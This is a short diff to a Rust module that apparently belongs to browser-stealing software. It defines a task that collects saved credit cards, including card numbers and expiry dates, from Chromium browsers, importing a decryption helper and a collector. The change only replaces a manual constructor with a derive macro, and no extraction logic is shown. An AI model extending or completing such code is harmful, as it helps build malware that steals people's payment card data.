@@ -2,6 +2,7 @@ use crate::alloc::borrow::ToOwned;
 use crate::chromium::{BrowserData, decrypt_data};
 use crate::{CreditCard, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
 use alloc::sync::Arc;
+use derive_new::new;
 use collector::{Browser, Collector};
 use database::TableRecord;
 use filesystem::FileSystem;
@@ -16,14 +17,9 @@ const CREDIT_CARDS_EXPIRATION_YEAR: usize = 3;
 const CREDIT_CARDS_CARD_NUMBER: usize = 4;
 const CREDIT_CARDS_USE_COUNT: usize = 7;
 
+#[derive(new)]
 pub(super) struct CreditCardsTask {
     browser: Arc<BrowserData>,
-}
-
-impl CreditCardsTask {
-    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
-        Self { browser }
-    }
 }
 
 impl<C: Collector, F: FileSystem> Task<C, F> for CreditCardsTask {
